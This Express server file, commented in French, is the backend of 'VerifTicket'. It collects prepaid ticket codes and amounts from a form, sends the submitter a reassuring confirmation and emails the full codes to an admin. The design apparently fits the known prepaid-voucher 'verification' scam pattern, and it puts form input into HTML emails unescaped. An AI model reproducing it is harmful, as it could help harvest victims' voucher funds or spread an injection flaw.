require('dotenv').config(); // Charge les variables d'environnement du fichier .env

const express = require('express');
const path = require('path');
const SibApiV3Sdk = require('sib-api-v3-sdk'); // SDK Brevo

const app = express();
const PORT = process.env.PORT || 3000; // Utilise le port défini par l'environnement (Render) ou 3000

// --- Configuration de Brevo ---
let defaultClient = SibApiV3Sdk.ApiClient.instance;
let apiKey = defaultClient.authentications['api-key'];
apiKey.apiKey = process.env.BREVO_API_KEY; // Récupère la clé API de Brevo depuis les variables d'environnement

let apiInstance = new SibApiV3Sdk.TransactionalEmailsApi();
// --- Fin Configuration Brevo ---

// Middleware pour parser les requêtes POST avec application/x-www-form-urlencoded
app.use(express.urlencoded({ extended: true }));
// Middleware pour parser les requêtes POST avec application/json (au cas où tu utiliserais fetch avec JSON)
app.use(express.json());

// Servir les fichiers statiques du dossier 'public'
app.use(express.static(path.join(__dirname, 'public')));

// Route principale pour servir le fichier index.html
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// Route pour gérer la soumission du formulaire
app.post('/submit-ticket', async (req, res) => {
    // Les données du formulaire sont dans req.body
    const { email, devise, type1, code1, montant1, type2, code2, montant2, type3, code3, montant3 } = req.body;

    // --- Validation rudimentaire (à améliorer si besoin) ---
    if (!email || !devise || (!code1 && !code2 && !code3)) {
        return res.status(400).json({ success: false, message: "Veuillez remplir au moins l'email, la devise et un code de ticket." });
    }

    // Préparation des données du ticket
    const tickets = [];
    if (type1 && code1 && montant1) tickets.push({ type: type1, code: code1, montant: montant1 });
    if (type2 && code2 && montant2) tickets.push({ type: type2, code: code2, montant: montant2 });
    if (type3 && code3 && montant3) tickets.push({ type: type3, code: code3, montant: montant3 });

    if (tickets.length === 0) {
        return res.status(400).json({ success: false, message: "Veuillez fournir les informations complètes d'au moins un ticket." });
    }

    // --- Préparation des e-mails ---
    const senderEmail = process.env.SENDER_EMAIL;
    const adminEmail = process.env.ADMIN_EMAIL;

    if (!senderEmail || !adminEmail || !apiKey.apiKey) {
        console.error("Erreur de configuration: Les variables d'environnement Brevo (SENDER_EMAIL, ADMIN_EMAIL, BREVO_API_KEY) ne sont pas toutes définies.");
        return res.status(500).json({ success: false, message: "Erreur de configuration du serveur d'e-mails." });
    }

    // 1. E-mail de confirmation au client
    let clientEmailContent = `
        <html>
        <head>
            <style>
                body { 
                    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
                    line-height: 1.6; 
                    color: #333333;
                    max-width: 600px;
                    margin: 0 auto;
                    padding: 20px;
                }
                .header {
                    background-color: #3498db;
                    color: white;
                    padding: 20px;
                    text-align: center;
                    border-radius: 5px 5px 0 0;
                }
                .content {
                    padding: 25px;
                    background-color: #ffffff;
                    border: 1px solid #e0e0e0;
                    border-top: none;
                    border-radius: 0 0 5px 5px;
                }
                .ticket-info {
                    background-color: #f8f9fa;
                    border-left: 4px solid #3498db;
                    padding: 15px;
                    margin: 20px 0;
                    border-radius: 0 4px 4px 0;
                }
                .total-amount {
                    font-size: 1.2em;
                    font-weight: bold;
                    color: #2c3e50;
                    margin: 20px 0;
                    padding: 10px;
                    background-color: #e8f4fc;
                    border-radius: 4px;
                    text-align: center;
                }
                .footer {
                    margin-top: 30px;
                    padding-top: 20px;
                    border-top: 1px solid #e0e0e0;
                    font-size: 0.9em;
                    color: #7f8c8d;
                }
            </style>
        </head>
        <body>
            <div class="header">
                <h1 style="margin: 0; color: white;">Confirmation de votre demande</h1>
            </div>
            
            <div class="content">
                <p>Bonjour,</p>
                
                <p>Nous accusons bonne réception de votre demande de vérification de ticket(s). Notre équipe traite actuellement votre requête avec la plus grande attention.</p>
                
                <div class="ticket-info">
                    <p><strong>Détails de votre demande :</strong></p>
                    <p>• Type(s) de ticket : ${tickets.map(t => t.type).join(', ')}</p>
                    <p>• Nombre de tickets : ${tickets.length}</p>
                </div>
                
                <div class="total-amount">
                    Montant total : ${tickets.reduce((sum, t) => sum + parseFloat(t.montant), 0).toFixed(2)} ${devise}
                </div>
                
                <p>Nous vous tiendrons informé(e) par e-mail dès que la vérification sera terminée. La durée de traitement peut varier en fonction du nombre de demandes en cours.</p>
                
                <p>Nous vous remercions pour votre confiance et votre patience.</p>
                
                <div class="footer">
                    <p>Cordialement,<br>L'équipe VerifTicket</p>
                </div>
            </div>
        </body>
        </html>
    `;

    let sendClientEmail = new SibApiV3Sdk.SendSmtpEmail();
    sendClientEmail.subject = "Votre demande de vérification de ticket est en cours !";
    sendClientEmail.htmlContent = clientEmailContent;
    sendClientEmail.sender = {"name": "VerifTicket Support", "email": senderEmail};
    sendClientEmail.to = [{"email": email}];

    // 2. E-mail de notification à l'administrateur
    let adminEmailContent = `
        <html>
        <head>
            <style>
                body { font-family: Arial, sans-serif; line-height: 1.6; color: #333; }
                h1 { color: #2c3e50; }
                .ticket-table {
                    width: 100%;
                    border-collapse: collapse;
                    margin: 20px 0;
                    box-shadow: 0 1px 3px rgba(0,0,0,0.2);
                }
                .ticket-table th {
                    background-color: #3498db;
                    color: white;
                    text-align: left;
                    padding: 12px;
                }
                .ticket-table td {
                    padding: 10px 12px;
                    border-bottom: 1px solid #ddd;
                }
                .ticket-table tr:nth-child(even) {
                    background-color: #f9f9f9;
                }
                .ticket-table tr:hover {
                    background-color: #f1f1f1;
                }
                .info-box {
                    background-color: #f8f9fa;
                    border-left: 4px solid #3498db;
                    padding: 10px 15px;
                    margin: 15px 0;
                }
            </style>
        </head>
        <body>
            <h1>Nouvelle soumission de ticket à vérifier !</h1>
            
            <div class="info-box">
                <p><strong>Client E-mail:</strong> ${email}</p>
                <p><strong>Devise:</strong> ${devise}</p>
                <p><strong>Date de soumission:</strong> ${new Date().toLocaleString()}</p>
            </div>
            
            <h2>Détails des Tickets</h2>
            <table class="ticket-table">
                <thead>
                    <tr>
                        <th>Type de ticket</th>
                        <th>Code</th>
                        <th>Montant (${devise})</th>
                    </tr>
                </thead>
                <tbody>
                    ${tickets.map(t => `
                        <tr>
                            <td>${t.type}</td>
                            <td><strong>${t.code}</strong></td>
                            <td>${parseFloat(t.montant).toFixed(2)}</td>
                        </tr>
                    `).join('')}
                </tbody>
                <tfoot>
                    <tr>
                        <td colspan="2" style="text-align: right;"><strong>Total:</strong></td>
                        <td><strong>${tickets.reduce((sum, t) => sum + parseFloat(t.montant), 0).toFixed(2)} ${devise}</strong></td>
                    </tr>
                </tfoot>
            </table>
            
            <div class="info-box">
                <p>Veuillez vous connecter à l'interface d'administration pour effectuer la vérification de ces tickets.</p>
            </div>
        </body>
        </html>
    `;

    let sendAdminEmail = new SibApiV3Sdk.SendSmtpEmail();
    sendAdminEmail.subject = `[URGENT] Nouvelle demande de vérification: ${email}`;
    sendAdminEmail.htmlContent = adminEmailContent;
    sendAdminEmail.sender = {"name": "VerifTicket Notifications", "email": senderEmail};
    sendAdminEmail.to = [{"email": adminEmail}]; // Envoie à ton adresse admin

    try {
        // Envoi de l'e-mail au client
        await apiInstance.sendTransacEmail(sendClientEmail);
        console.log(`E-mail de confirmation envoyé au client: ${email}`);

        // Envoi de l'e-mail à l'administrateur
        await apiInstance.sendTransacEmail(sendAdminEmail);
        console.log(`E-mail de notification envoyé à l'admin: ${adminEmail}`);

        res.json({ success: true, message: "Votre demande a été soumise avec succès et un e-mail de confirmation vous a été envoyé !" });

    } catch (error) {
        console.error('Erreur lors de l\'envoi des e-mails Brevo:', error.response ? error.response.text : error.message);
        // Tente de récupérer plus de détails si l'erreur vient de l'API Brevo
        let errorMessage = "Une erreur est survenue lors de l'envoi des e-mails.";
        if (error.response && error.response.text) {
            try {
                const errorDetails = JSON.parse(error.response.text);
                errorMessage = errorDetails.message || errorMessage;
            } catch (e) {
                errorMessage = error.response.text;
            }
        }
        res.status(500).json({ success: false, message: errorMessage });
    }
});


// Démarrer le serveur
app.listen(PORT, () => {
    console.log(`Serveur démarré sur le port ${PORT}`);
    console.log(`Accès local: http://localhost:${PORT}`);
});